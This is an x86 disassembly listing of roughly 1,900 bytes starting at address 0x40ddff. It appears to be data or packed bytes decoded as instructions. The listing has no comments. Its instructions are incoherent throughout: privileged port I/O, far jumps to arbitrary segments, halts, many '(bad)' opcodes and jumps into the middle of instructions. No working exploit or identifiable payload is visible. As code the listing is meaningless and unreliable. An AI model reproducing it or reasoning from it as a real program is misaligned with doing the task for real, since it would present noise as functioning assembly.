  40ddff:	mov    ds:0xd9a060e2,eax
  40de04:	in     al,dx
  40de05:	pushf  
  40de06:	adc    eax,0x4a715fa8
  40de0b:	test   al,0x1d
  40de0d:	and    al,0x96
  40de0f:	rol    DWORD PTR [edx],1
  40de11:	xchg   esi,eax
  40de12:	xchg   esi,eax
  40de13:	scas   eax,DWORD PTR es:[edi]
  40de14:	pop    ecx
  40de15:	out    dx,al
  40de16:	push   ebp
  40de17:	cmp    eax,0xdf461cb
  40de1c:	test   BYTE PTR [eax],ah
  40de1e:	xchg   edx,eax
  40de1f:	lea    eax,[esi+0x12]
  40de22:	xchg   BYTE PTR [ebp+0x67fa6188],dh
  40de28:	inc    edi
  40de29:	shl    DWORD PTR ds:0x374931f8,cl
  40de2f:	repnz pop ds
  40de31:	push   es
  40de32:	sub    BYTE PTR [ebp-0x3],al
  40de35:	inc    edx
  40de36:	int3   
  40de37:	or     eax,0x19231839
  40de3c:	adc    DWORD PTR [ebp+0x20],esp
  40de3f:	mov    edi,0x4f92fd8f
  40de44:	sbb    ebx,DWORD PTR [ebp+0xc504954]
  40de4a:	repz scas al,BYTE PTR es:[edi]
  40de4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de4d:	xlat   BYTE PTR ds:[ebx]
  40de4e:	cmp    ah,bh
  40de50:	sub    ebx,eax
  40de52:	je     0x40de41
  40de54:	and    al,0xbe
  40de56:	ficomp DWORD PTR [esi-0x1ea28fe0]
  40de5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de5d:	stos   BYTE PTR es:[edi],al
  40de5e:	sbb    al,0xf9
  40de60:	pusha  
  40de61:	hlt    
  40de62:	outs   dx,DWORD PTR ds:[esi]
  40de63:	sub    DWORD PTR [edx],0xffffffe8
  40de66:	xor    dh,al
  40de68:	or     al,0x79
  40de6a:	jmp    0x547e:0x9ecc2e9c
  40de71:	fistp  DWORD PTR ds:0xb162d167
  40de77:	repz test esi,ebp
  40de7a:	repnz add edx,DWORD PTR [edi]
  40de7d:	add    BYTE PTR [edx-0x55],al
  40de80:	inc    ebx
  40de81:	inc    ebx
  40de82:	mov    ebx,DWORD PTR [ebp*8+0x6c161400]
  40de89:	shr    BYTE PTR [edx],0x49
  40de8c:	sti    
  40de8d:	retf   0xf534
  40de90:	xor    DWORD PTR [ebp-0x6febedf1],esp
  40de96:	jne    0x40deb0
  40de98:	mov    cl,dl
  40de9a:	stos   BYTE PTR es:[edi],al
  40de9b:	pop    esp
  40de9c:	pop    eax
  40de9d:	or     BYTE PTR [ebx],dl
  40de9f:	jae    0x40debc
  40dea1:	mov    ch,0x4e
  40dea3:	xchg   edi,eax
  40dea4:	fucomi st,st(5)
  40dea6:	or     eax,0x14f26cda
  40deab:	mov    bh,0xee
  40dead:	push   ss
  40deae:	test   DWORD PTR [edx-0x4d8015ab],ebx
  40deb4:	into   
  40deb5:	scas   eax,DWORD PTR es:[edi]
  40deb6:	sar    BYTE PTR [edi-0x58c0f67d],cl
  40debc:	adc    esp,DWORD PTR [ecx]
  40debe:	fldl2t 
  40dec0:	sbb    ecx,0x4f
  40dec3:	jbe    0x40dede
  40dec5:	pop    ebp
  40dec6:	in     eax,dx
  40dec7:	cmp    bh,ah
  40dec9:	sub    al,0x35
  40decb:	mov    edi,0xad52c392
  40ded0:	inc    edx
  40ded1:	push   es
  40ded2:	rol    ebp,0x70
  40ded5:	mov    dh,0x96
  40ded7:	jo     0x40decf
  40ded9:	retf   
  40deda:	inc    esp
  40dedb:	cmp    bh,BYTE PTR [eax+ebp*2]
  40dede:	or     eax,0xf44bcd7e
  40dee3:	add    eax,0x6fa45505
  40dee8:	retf   0xbc8e
  40deeb:	idiv   DWORD PTR [ecx+0x5c49d6c6]
  40def1:	jl     0x40deba
  40def3:	xchg   edx,eax
  40def4:	data16 mov ah,0xe4
  40def7:	jp     0x40def7
  40def9:	mov    BYTE PTR [eax],al
  40defb:	xchg   BYTE PTR [ebx+edi*8-0x74],ch
  40deff:	push   ecx
  40df00:	mov    ds:0x53bd5cad,eax
  40df05:	mov    al,0xcd
  40df07:	out    dx,al
  40df08:	add    DWORD PTR [ebp-0x581d9725],0x4d
  40df0f:	xor    ebx,edi
  40df11:	add    eax,0x5b298b4a
  40df16:	mov    cs,WORD PTR [ebx]
  40df18:	cli    
  40df19:	pusha  
  40df1a:	js     0x40df89
  40df1c:	lods   al,BYTE PTR ds:[esi]
  40df1d:	sbb    ebx,DWORD PTR [edx+0x97120ec]
  40df23:	pop    edx
  40df24:	fisttp WORD PTR [edx-0x2d87f909]
  40df2a:	push   cs
  40df2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df2c:	sub    BYTE PTR [eax],0x69
  40df2f:	cmp    al,BYTE PTR [ecx]
  40df31:	jb     0x40df90
  40df33:	or     al,0xd9
  40df35:	xchg   DWORD PTR [esi-0x80],esp
  40df38:	cmp    BYTE PTR [ecx-0x787c8b14],bl
  40df3e:	stc    
  40df3f:	mov    edi,DWORD PTR [eax+0x2882fd31]
  40df45:	ins    BYTE PTR es:[edi],dx
  40df46:	push   cs
  40df47:	jae    0x40df67
  40df49:	call   0xb3cc:0x4879ec0d
  40df50:	cli    
  40df51:	dec    eax
  40df52:	arpl   WORD PTR [ebx],di
  40df54:	fsubr  DWORD PTR [edi-0x5de55330]
  40df5a:	cmp    ecx,ebp
  40df5c:	dec    edi
  40df5d:	xchg   bp,ax
  40df5f:	mov    esp,0xbc7ab45b
  40df64:	mov    edi,0x54d81bb
  40df69:	inc    ebx
  40df6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df6b:	mov    edx,0xc9180351
  40df70:	jo     0x40dfef
  40df72:	cmc    
  40df73:	sub    bh,BYTE PTR [ebp-0x5bde2f5a]
  40df79:	fmul   DWORD PTR [ebp+0x5d]
  40df7c:	cld    
  40df7d:	mov    esp,0xe0158621
  40df82:	add    al,BYTE PTR [ebx+0xc]
  40df85:	imul   esp,DWORD PTR [ebx-0x74],0xd884921d
  40df8c:	and    eax,0x7517ce7d
  40df91:	pushf  
  40df92:	lods   eax,DWORD PTR ds:[esi]
  40df93:	xchg   ecx,eax
  40df94:	out    dx,al
  40df95:	test   al,0x35
  40df97:	(bad)  
  40df98:	shl    DWORD PTR [ebp-0x1e],cl
  40df9b:	push   esp
  40df9c:	sub    dl,dh
  40df9e:	pop    esp
  40df9f:	dec    ebx
  40dfa0:	xchg   edx,eax
  40dfa1:	dec    esp
  40dfa2:	bnd jg 0x40dfc0
  40dfa5:	mov    fs,WORD PTR [ecx+ebx*2-0x4c5c4e67]
  40dfac:	mov    BYTE PTR [eax+0x58db9897],ah
  40dfb2:	jmp    0x90d9:0x4b9bf2e
  40dfb9:	inc    eax
  40dfba:	mov    edi,0x2e065a93
  40dfbf:	aaa    
  40dfc0:	jmp    0x40dff8
  40dfc2:	xor    dh,dl
  40dfc4:	add    esp,0xffffffe8
  40dfc7:	dec    edx
  40dfc8:	pop    ebx
  40dfc9:	xchg   esp,eax
  40dfca:	jp     0x40e038
  40dfcc:	and    al,0x43
  40dfce:	dec    ebp
  40dfcf:	das    
  40dfd0:	lea    eax,[esi-0x1c]
  40dfd3:	cmp    BYTE PTR [esi-0x58],cl
  40dfd6:	jg     0x40dfda
  40dfd8:	aad    0x52
  40dfda:	es pop esi
  40dfdc:	mov    dh,0x34
  40dfde:	sbb    DWORD PTR [edx],ebx
  40dfe0:	or     eax,0x35131610
  40dfe5:	cwde   
  40dfe6:	hlt    
  40dfe7:	retf   
  40dfe8:	(bad)  
  40dfe9:	test   eax,0x24cef1bc
  40dfee:	cmp    esp,DWORD PTR [edi+0x66]
  40dff1:	imul   ebx,DWORD PTR [eax+esi*8],0xffffffd2
  40dff5:	ret    
  40dff6:	jg     0x40e053
  40dff8:	in     al,0xf0
  40dffa:	test   BYTE PTR [edx+0xf],dh
  40dffd:	adc    eax,0xa1563b2e
  40e002:	sub    eax,0xcfda073e
  40e007:	xor    ebx,ebp
  40e009:	ficomp WORD PTR [si]
  40e00c:	int    0xdd
  40e00e:	(bad)  
  40e00f:	rol    BYTE PTR [edi+0x10efd607],1
  40e015:	pop    edx
  40e016:	cs and eax,0x2ece17da
  40e01c:	fcmove st,st(4)
  40e01e:	push   ecx
  40e01f:	loope  0x40e03e
  40e021:	mov    al,ds:0xa31c84fb
  40e026:	imul   esp,ebx,0x4b85c27
  40e02c:	les    eax,FWORD PTR [ecx]
  40e02e:	call   0x74f0:0x1c4bd50c
  40e035:	mov    edi,DWORD PTR [esi-0x75cac13]
  40e03b:	jns    0x40e028
  40e03d:	pop    esi
  40e03e:	dec    ebp
  40e03f:	jae    0x40e060
  40e041:	imul   edx,DWORD PTR [edi-0x3c2c7688],0xe7b1a068
  40e04b:	xchg   ch,cl
  40e04d:	inc    ecx
  40e04e:	ffreep st(6)
  40e050:	push   ebp
  40e051:	push   edi
  40e052:	dec    eax
  40e053:	pop    ds
  40e054:	repnz sbb BYTE PTR [eax+ebx*2-0x46],dl
  40e059:	dec    esi
  40e05a:	stos   DWORD PTR es:[edi],eax
  40e05b:	in     al,dx
  40e05c:	xor    al,BYTE PTR ds:0xdc5ab19b
  40e062:	mov    dh,0xbc
  40e064:	js     0x40e07c
  40e066:	loop   0x40e0d8
  40e068:	jmp    0xfb0a:0xcaf404f5
  40e06f:	mov    al,0xad
  40e071:	rol    WORD PTR fs:0x40bad43f,cl
  40e079:	push   esi
  40e07a:	jg     0x40e0c6
  40e07c:	enter  0x442d,0x2
  40e080:	xor    cl,BYTE PTR [edx-0x7fd0fc00]
  40e086:	(bad)  [eax*1-0x2e5e62b2]
  40e08d:	popf   
  40e08e:	mov    ds:0x91daa7da,al
  40e093:	inc    edx
  40e094:	popf   
  40e095:	sub    cl,ch
  40e097:	inc    ebp
  40e098:	dec    ecx
  40e099:	mov    ebx,0xcb322520
  40e09e:	dec    ecx
  40e09f:	unpcklps xmm3,XMMWORD PTR [esi+0x22d715cd]
  40e0a6:	in     al,dx
  40e0a7:	cmp    al,0x71
  40e0a9:	(bad)  
  40e0aa:	sahf   
  40e0ab:	fst    st(2)
  40e0ad:	push   0xffffffc0
  40e0af:	cmp    bl,al
  40e0b1:	xchg   ebx,eax
  40e0b2:	add    ebx,ebx
  40e0b4:	icebp  
  40e0b5:	les    eax,FWORD PTR ds:0xb168401e
  40e0bb:	mov    ah,0xe7
  40e0bd:	jmp    0x70883424
  40e0c2:	test   al,0x76
  40e0c4:	cmp    eax,eax
  40e0c6:	jae    0x40e0ae
  40e0c8:	push   edi
  40e0c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0ca:	sub    ecx,DWORD PTR [esi+0x4246d9c4]
  40e0d0:	adc    edx,ebx
  40e0d2:	sbb    BYTE PTR [esi+0x15],ah
  40e0d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0d6:	jp     0x40e0d2
  40e0d8:	iret   
  40e0d9:	dec    edi
  40e0da:	inc    esi
  40e0db:	mov    DWORD PTR [eax-0x7c],ecx
  40e0de:	fwait
  40e0df:	add    DWORD PTR [ebx+eax*4],edx
  40e0e2:	jmp    0x40e12b
  40e0e4:	mov    ah,0x41
  40e0e6:	jecxz  0x40e14a
  40e0e8:	push   edi
  40e0e9:	lock sahf 
  40e0eb:	jecxz  0x40e12b
  40e0ed:	gs aad 0xf6
  40e0f0:	fcomp  QWORD PTR [edi]
  40e0f2:	sbb    bh,BYTE PTR [edx+0x7d0b7a91]
  40e0f8:	lods   al,BYTE PTR ds:[esi]
  40e0f9:	push   ecx
  40e0fa:	pop    esp
  40e0fb:	fdivr  DWORD PTR [edx-0x75]
  40e0fe:	call   ebx
  40e100:	retf   0xbc37
  40e103:	push   ss
  40e104:	es adc eax,0x17fb65cf
  40e10a:	xor    eax,0x9a9b70b7
  40e10f:	push   esi
  40e110:	lock xchg BYTE PTR [bp+0x4db9],al
  40e116:	shl    BYTE PTR [edi+0x45],0x8c
  40e11a:	add    ebp,DWORD PTR [ecx]
  40e11c:	push   ss
  40e11d:	jg     0x40e0b4
  40e11f:	mov    cl,BYTE PTR [ebx+eiz*4+0xbb7bca7]
  40e126:	out    0x82,eax
  40e128:	jle    0x40e15d
  40e12a:	xor    BYTE PTR [edi+esi*8],cl
  40e12d:	jns    0x40e17d
  40e12f:	js     0x40e0e8
  40e131:	jne    0x40e0da
  40e133:	in     eax,dx
  40e134:	adc    al,0x16
  40e136:	and    ecx,esp
  40e138:	icebp  
  40e139:	inc    edx
  40e13a:	repnz dec DWORD PTR [ecx]
  40e13d:	sub    BYTE PTR [ecx-0x54],dl
  40e140:	ror    dh,cl
  40e142:	push   ebx
  40e143:	mov    eax,ds:0xb013bf65
  40e148:	call   0x74e0fe75
  40e14d:	loope  0x40e0e8
  40e14f:	adc    bl,BYTE PTR [ecx]
  40e151:	and    BYTE PTR [ecx+0x81fae1f],dl
  40e157:	xchg   edi,eax
  40e158:	xchg   edx,eax
  40e159:	rol    BYTE PTR [edx+ebx*4],cl
  40e15c:	js     0x40e149
  40e15e:	adc    cl,bh
  40e160:	inc    edx
  40e161:	arpl   WORD PTR [esi+0x3],ax
  40e164:	push   ebp
  40e165:	mov    al,0x8c
  40e167:	or     dh,cl
  40e169:	jg     0x40e179
  40e16b:	stc    
  40e16c:	aas    
  40e16d:	imul   DWORD PTR [eax-0x3b]
  40e170:	push   edi
  40e171:	mov    bl,0x1a
  40e173:	push   edi
  40e174:	dec    ecx
  40e175:	push   ebp
  40e176:	add    ah,dh
  40e178:	adc    BYTE PTR [ebp+0x5e],bh
  40e17b:	in     eax,dx
  40e17c:	jecxz  0x40e14f
  40e17e:	(bad)  
  40e17f:	in     al,0x3b
  40e181:	bound  ebp,QWORD PTR [ebp+0x61]
  40e184:	jp     0x40e203
  40e186:	jmp    0xa6ce:0xd2059796
  40e18d:	inc    edi
  40e18e:	out    dx,eax
  40e18f:	pop    edi
  40e190:	mov    al,ds:0xb50afe5a
  40e195:	and    al,0xcd
  40e197:	rcr    BYTE PTR ds:0x2b41c10c,0xb0
  40e19e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e19f:	popf   
  40e1a0:	pusha  
  40e1a1:	ins    BYTE PTR es:[edi],dx
  40e1a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1a3:	adc    al,BYTE PTR [edx]
  40e1a5:	jo     0x40e16c
  40e1a7:	jbe    0x40e12a
  40e1a9:	push   ebx
  40e1aa:	or     BYTE PTR [eax-0x617ed7e8],bl
  40e1b0:	fld    QWORD PTR [ebp+0x63]
  40e1b3:	add    ecx,esp
  40e1b5:	mov    dl,0xbc
  40e1b7:	pop    ebx
  40e1b8:	jg     0x40e1c4
  40e1ba:	rcr    edx,0xa1
  40e1bd:	xchg   BYTE PTR [ebx+0x13048dfc],ah
  40e1c3:	dec    esi
  40e1c4:	rol    DWORD PTR [edi+ebp*2-0x70be0f3e],1
  40e1cb:	mov    edi,0x67bb55af
  40e1d0:	test   BYTE PTR [ebx+edx*8+0x1759c345],bh
  40e1d7:	ss sub eax,0xb4a33c59
  40e1dd:	sub    BYTE PTR [edi-0x4f369b15],ch
  40e1e3:	into   
  40e1e4:	aad    0xbc
  40e1e6:	jmp    0x68f9dc2
  40e1eb:	popf   
  40e1ec:	ror    BYTE PTR [ebx+eiz*4-0x2f],0x1f
  40e1f1:	jmp    0x40e1b6
  40e1f3:	sbb    cl,bl
  40e1f5:	(bad)  
  40e1f6:	in     eax,0xe
  40e1f8:	jnp    0x40e1e3
  40e1fa:	sti    
  40e1fb:	xor    bl,BYTE PTR [ebx-0x60]
  40e1fe:	dec    ecx
  40e1ff:	and    dl,BYTE PTR [esi+0x36]
  40e202:	(bad)
  40e206:	popa   
  40e207:	jo     0x40e1ab
  40e209:	dec    esp
  40e20a:	loop   0x40e273
  40e20c:	pop    es
  40e20d:	or     eax,0x8f44998
  40e212:	or     al,BYTE PTR [eax+esi*1+0x30]
  40e216:	nop
  40e217:	dec    edi
  40e219:	cmp    cl,BYTE PTR [ecx]
  40e21b:	stc    
  40e21c:	jmp    0xcb08868f
  40e221:	jbe    0x40e1d4
  40e223:	cmp    al,0x4
  40e225:	or     dl,BYTE PTR [ecx+0x59]
  40e228:	xchg   BYTE PTR [edi+0x447b647c],bh
  40e22e:	lahf   
  40e22f:	int    0xe7
  40e231:	jne    0x40e2ae
  40e233:	fsub   QWORD PTR [ecx+eax*4+0x4b]
  40e237:	dec    BYTE PTR [esi+0x65]
  40e23a:	sbb    BYTE PTR [eax-0x50],0x89
  40e23e:	shl    DWORD PTR [ecx-0x21],cl
  40e241:	enter  0x64c0,0x4f
  40e245:	lods   al,BYTE PTR ds:[esi]
  40e246:	jp     0x40e296
  40e248:	cld    
  40e249:	pop    es
  40e24a:	sar    BYTE PTR [ebx-0x41],1
  40e24d:	aas    
  40e24e:	stos   BYTE PTR es:[edi],al
  40e24f:	jnp    0x40e298
  40e251:	jge    0x40e27c
  40e253:	popf   
  40e254:	outs   dx,DWORD PTR ds:[esi]
  40e255:	mov    bh,0xe3
  40e257:	dec    edi
  40e258:	fnstenv [eax+0x5d]
  40e25b:	mov    ebx,0x97bc6eaf
  40e260:	cmp    ah,bh
  40e262:	addr16 cli 
  40e264:	int3   
  40e265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e266:	dec    esp
  40e267:	inc    edx
  40e268:	cdq    
  40e269:	xor    al,0xec
  40e26b:	in     eax,dx
  40e26c:	or     ah,BYTE PTR [edi]
  40e26e:	pop    es
  40e26f:	sbb    DWORD PTR [ebp+eax*8+0x3a],ebp
  40e273:	jbe    0x40e2bd
  40e275:	xchg   ebx,eax
  40e276:	rcr    DWORD PTR [eax-0xc37db93],1
  40e27c:	inc    ecx
  40e27d:	aad    0xf8
  40e27f:	or     bh,dl
  40e281:	pop    ebx
  40e282:	aam    0xd4
  40e284:	out    dx,al
  40e285:	mov    dl,0xb0
  40e287:	loopne 0x40e273
  40e289:	jge    0x40e2b2
  40e28b:	push   ecx
  40e28c:	jmp    FWORD PTR [ebx]
  40e28e:	in     eax,dx
  40e28f:	movaps xmm6,XMMWORD PTR ds:0xd2de9853
  40e296:	out    dx,eax
  40e297:	call   0xfbcdb4
  40e29c:	mov    BYTE PTR [eax],bh
  40e29e:	cmp    BYTE PTR [esp+edx*2-0x4],0xff
  40e2a3:	sub    DWORD PTR [ecx+ebp*2],edx
  40e2a6:	mov    bh,0x69
  40e2a8:	fs pop esp
  40e2aa:	test   BYTE PTR [esi-0x483414cb],al
  40e2b0:	rcl    cl,1
  40e2b2:	add    ch,BYTE PTR fs:[ecx+0x77]
  40e2b6:	nop
  40e2b7:	sbb    eax,0xd53af8d9
  40e2bc:	repnz imul esi,DWORD PTR [ebx+ecx*2],0x4f8d24fa
  40e2c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2c6:	mov    eax,0x8641c17a
  40e2cb:	sti    
  40e2cc:	retf   
  40e2cd:	enter  0xa574,0x12
  40e2d1:	push   esp
  40e2d2:	pop    ebp
  40e2d3:	imul   edi,DWORD PTR [ecx+0x538cfe3c],0x2e
  40e2da:	cld    
  40e2db:	std    
  40e2dc:	or     eax,0x6396e98a
  40e2e1:	popf   
  40e2e2:	sbb    eax,0x465e66f4
  40e2e7:	mov    dh,0xb3
  40e2e9:	pop    ebx
  40e2ea:	sub    bh,ah
  40e2ec:	daa    
  40e2ed:	cs mov ebp,?
  40e2f0:	mov    al,0x41
  40e2f2:	add    DWORD PTR [ecx-0x67],edi
  40e2f5:	push   edx
  40e2f6:	loopne 0x40e2e9
  40e2f8:	xor    DWORD PTR [esp+esi*2],0x6c4d599e
  40e2ff:	push   cs
  40e300:	and    BYTE PTR [ebp+ebp*4-0x20],al
  40e304:	in     al,dx
  40e305:	popf   
  40e306:	std    
  40e307:	cmp    ch,cl
  40e309:	mov    bl,0xf5
  40e30b:	push   edi
  40e30c:	loopne 0x40e2b4
  40e30e:	jns    0x40e31b
  40e310:	shl    ebx,0xd
  40e313:	in     eax,dx
  40e314:	inc    esi
  40e315:	mov    edi,0xf94eabf9
  40e31a:	aaa    
  40e31b:	jne    0x40e2ae
  40e31d:	mov    ch,0x9b
  40e31f:	sar    BYTE PTR ds:0x42474d3d,0xa
  40e326:	es pop ss
  40e328:	sub    BYTE PTR [eax],ah
  40e32a:	jmp    0xa5c9:0xada77fab
  40e331:	imul   edx,DWORD PTR [esi+0x2d55c268],0xe
  40e338:	xchg   ebx,eax
  40e339:	aam    0x7a
  40e33b:	mov    WORD PTR [esi+0x64bd68c],ss
  40e341:	arpl   WORD PTR [edi-0x377ad414],di
  40e347:	push   ebx
  40e348:	sub    al,0x76
  40e34a:	pushf  
  40e34b:	leave  
  40e34c:	dec    esi
  40e34d:	popf   
  40e34e:	xchg   ebx,eax
  40e34f:	outs   dx,BYTE PTR ds:[esi]
  40e350:	sahf   
  40e351:	mov    BYTE PTR [esi-0x105c4fdc],bl
  40e357:	push   ebx
  40e358:	mov    esi,0xb00a44fa
  40e35d:	ret    0x5fbc
  40e360:	dec    esp
  40e361:	cld    
  40e362:	xchg   ebx,eax
  40e363:	mov    bl,0xab
  40e365:	push   es
  40e366:	inc    esi
  40e367:	enter  0x5da,0x8b
  40e36b:	jnp    0x40e3e9
  40e36d:	inc    ebx
  40e36e:	cmp    dh,ch
  40e370:	mov    cl,0xb9
  40e372:	jmp    0x3454479f
  40e377:	and    ebx,DWORD PTR [edx-0x7e0b9485]
  40e37d:	std    
  40e37e:	and    al,0x6a
  40e380:	or     eax,0x38dfaee6
  40e385:	adc    BYTE PTR ds:0x4cd01552,dh
  40e38b:	cs sbb eax,esi
  40e38e:	je     0x40e371
  40e390:	lahf   
  40e391:	jnp    0x40e3d1
  40e393:	inc    eax
  40e394:	pop    ebp
  40e395:	mov    dl,0x93
  40e397:	cmp    eax,0xe361d5b9
  40e39c:	push   edi
  40e39d:	leave  
  40e39e:	(bad)  
  40e39f:	mov    ds:0xe8a0cc70,eax
  40e3a4:	pop    ecx
  40e3a5:	fistp  QWORD PTR [ebp+0x25]
  40e3a8:	sbb    eax,0x97a83f19
  40e3ad:	xor    cl,bh
  40e3af:	push   0xffffffd4
  40e3b1:	in     eax,dx
  40e3b2:	adc    DWORD PTR [edi+0x27349ea3],eax
  40e3b8:	cmp    bh,BYTE PTR [edi-0x28]
  40e3bb:	mov    ecx,0x4dbfa9c
  40e3c0:	dec    edi
  40e3c1:	xor    BYTE PTR fs:[eax],ah
  40e3c4:	push   eax
  40e3c5:	jno    0x40e34b
  40e3c7:	mov    esi,DWORD PTR [ecx-0x3e]
  40e3ca:	cwde   
  40e3cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3cc:	xchg   ecx,ecx
  40e3ce:	cld    
  40e3cf:	rol    edi,1
  40e3d1:	es xor cl,ah
  40e3d4:	addr16 test al,0x99
  40e3d7:	push   eax
  40e3d8:	mov    BYTE PTR [edx-0x4],bl
  40e3db:	and    DWORD PTR [ecx],edi
  40e3dd:	pop    ebx
  40e3de:	repz pushf 
  40e3e0:	pop    ebp
  40e3e1:	adc    BYTE PTR [ebx+ecx*2-0x54],bh
  40e3e5:	(bad)  
  40e3e6:	lea    ebx,[edi]
  40e3e8:	dec    eax
  40e3e9:	ds into 
  40e3eb:	dec    ecx
  40e3ec:	xor    esp,DWORD PTR [esi]
  40e3ee:	fild   QWORD PTR [eax]
  40e3f0:	les    edx,FWORD PTR [esi+0x33]
  40e3f3:	pop    edx
  40e3f4:	dec    ecx
  40e3f5:	or     al,0xbf
  40e3f7:	inc    ecx
  40e3f8:	push   edx
  40e3f9:	sub    ebx,DWORD PTR gs:[ebx-0x4e]
  40e3fd:	xor    eax,ebp
  40e3ff:	in     al,dx
  40e400:	dec    edi
  40e401:	hlt    
  40e402:	jns    0x40e44a
  40e404:	push   esp
  40e405:	idiv   esi
  40e407:	popa   
  40e408:	or     si,di
  40e40b:	(bad)  
  40e40c:	jb     0x40e38e
  40e40e:	push   ecx
  40e40f:	push   ds
  40e410:	jnp    0x40e3ae
  40e412:	jbe    0x40e3a9
  40e414:	or     DWORD PTR [edi-0x5caadf75],edx
  40e41a:	mov    edx,0x7b6f61ec
  40e41f:	fidivr WORD PTR [esi+0x4112cc6]
  40e425:	add    eax,0xff7688a4
  40e42a:	repz int 0xb3
  40e42d:	into   
  40e42e:	lahf   
  40e42f:	inc    esp
  40e430:	das    
  40e431:	je     0x40e416
  40e433:	leave  
  40e434:	push   ds
  40e435:	pop    edi
  40e436:	inc    edx
  40e437:	fisttp DWORD PTR [esi+0x70]
  40e43a:	ret    
  40e43b:	mov    bh,bh
  40e43d:	cmp    al,0x64
  40e43f:	push   eax
  40e440:	sti    
  40e441:	push   edi
  40e442:	scas   eax,DWORD PTR es:[edi]
  40e443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e444:	test   eax,0xf339a9d7
  40e449:	(bad)  
  40e44a:	lods   al,BYTE PTR ds:[esi]
  40e44b:	mov    al,BYTE PTR [edx]
  40e44d:	inc    ebp
  40e44e:	call   0xa139ff58
  40e453:	jo     0x40e433
  40e455:	dec    ebp
  40e456:	jmp    0xe087f3b4
  40e45b:	inc    BYTE PTR [edx+0x2a3b77e5]
  40e461:	dec    esp
  40e462:	add    dh,BYTE PTR gs:[esp+ebx*2-0x57]
  40e467:	(bad)  
  40e468:	in     al,0x9d
  40e46a:	dec    ecx
  40e46b:	hlt    
  40e46c:	dec    esi
  40e46d:	sub    dh,BYTE PTR [esi]
  40e46f:	frstor [edi+ecx*1+0x4359e46c]
  40e476:	xchg   edx,eax
  40e477:	xchg   esi,eax
  40e478:	pushf  
  40e479:	pop    edx
  40e47a:	xor    BYTE PTR [ecx],ch
  40e47c:	loopne 0x40e481
  40e47e:	push   edi
  40e47f:	sbb    BYTE PTR ds:0xbeaaceb6,0x38
  40e486:	popa   
  40e487:	(bad)  
  40e488:	jmp    0x40e4d3
  40e48a:	in     eax,dx
  40e48b:	jae    0x1ba5e58b
  40e491:	mov    dh,0xa3
  40e493:	or     DWORD PTR [edi+0x17],esp
  40e496:	test   DWORD PTR [ecx+0x1c68d931],esp
  40e49c:	adc    BYTE PTR [ebx],al
  40e49e:	outs   dx,DWORD PTR ds:[esi]
  40e49f:	xchg   ebx,eax
  40e4a0:	cs jne 0x40e48f
  40e4a3:	mov    ebp,0xc7639994
  40e4a8:	ss inc eax
  40e4aa:	pushf  
  40e4ab:	mov    ebx,0x65cb8e2e
  40e4b0:	mov    ch,ch
  40e4b2:	dec    ebp
  40e4b3:	in     al,dx
  40e4b4:	arpl   ax,dx
  40e4b6:	push   ecx
  40e4b7:	xchg   edx,eax
  40e4b8:	mov    ecx,0x5115ce3e
  40e4bd:	je     0x40e4c8
  40e4bf:	adc    eax,0x5eda300d
  40e4c4:	and    DWORD PTR [ebp-0x65],esi
  40e4c7:	int3   
  40e4c8:	(bad)  [edi+0x3c]
  40e4cb:	xchg   ecx,eax
  40e4cc:	sbb    DWORD PTR [edi+eax*2],ecx
  40e4cf:	push   esi
  40e4d0:	xchg   edx,eax
  40e4d1:	repz push cs
  40e4d3:	aas    
  40e4d4:	xchg   edx,eax
  40e4d5:	jl     0x40e514
  40e4d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4d8:	jmp    0x5bee56ea
  40e4dd:	rcl    DWORD PTR [ebx],0x17
  40e4e0:	mov    dl,0x28
  40e4e2:	lock jmp 0x40e518
  40e4e5:	or     BYTE PTR ds:0x6bd12779,cl
  40e4eb:	ins    BYTE PTR es:[edi],dx
  40e4ec:	enter  0xc9a3,0xe4
  40e4f0:	in     al,0xc1
  40e4f2:	sbb    BYTE PTR [edi+0x10],bh
  40e4f5:	sbb    BYTE PTR [ecx+0x5ef74f38],0xb2
  40e4fc:	repz sub ecx,ebx
  40e4ff:	jecxz  0x40e537
  40e501:	xor    BYTE PTR [edx-0x3de0f202],dl
  40e507:	inc    edx
  40e508:	jecxz  0x40e535
  40e50a:	sub    bl,BYTE PTR [edi+0x1694e3bc]
  40e510:	jmp    0xa11cd64d
  40e515:	not    DWORD PTR [eax-0x7a6fba8a]
  40e51b:	mov    eax,ds:0x49278547
  40e520:	std    
  40e521:	push   cs
  40e522:	and    DWORD PTR [ecx-0x5f],0xffffffa4
  40e526:	inc    ebx
  40e527:	add    eax,0xbdb28e1b
  40e52c:	jmp    0xd2c91a0d
  40e531:	cdq    
  40e532:	dec    edi
  40e533:	cmp    dh,ch
  40e535:	popa   
  40e536:	sti    
  40e537:	mov    ah,0x7
  40e539:	loopne 0x40e4fa
  40e53b:	xchg   esi,eax
  40e53c:	sub    al,0x4f
  40e53e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e53f:	mov    dh,0xb2
  40e541:	or     BYTE PTR [ebx+edi*2+0x0],ah
  40e545:	inc    eax
  40e546:	ret    
  40e547:	inc    ebp
  40e548:	ret    0xa94e
  40e54b:	retf   
  40e54c:	sbb    ebx,DWORD PTR [esi]
  40e54e:	daa    
  40e54f:	mov    ebp,0xc8b5eff2
  40e554:	in     al,dx
  40e555:	call   0x338c8aaf
  40e55a:	or     DWORD PTR [eax+ecx*4+0x485f0789],edi
  40e561:	sbb    eax,eax
  40e563:	fiadd  WORD PTR [ebp-0x6624e4fb]
  40e569:	mov    edi,0xd05be0a8
  40e56e:	mov    ds:0x88c9686,eax
  40e573:	adc    DWORD PTR [eax],esp
  40e575:	xchg   esp,eax
  40e576:	pop    ecx
  40e577:	inc    edx
  40e578:	mov    cl,0xdd
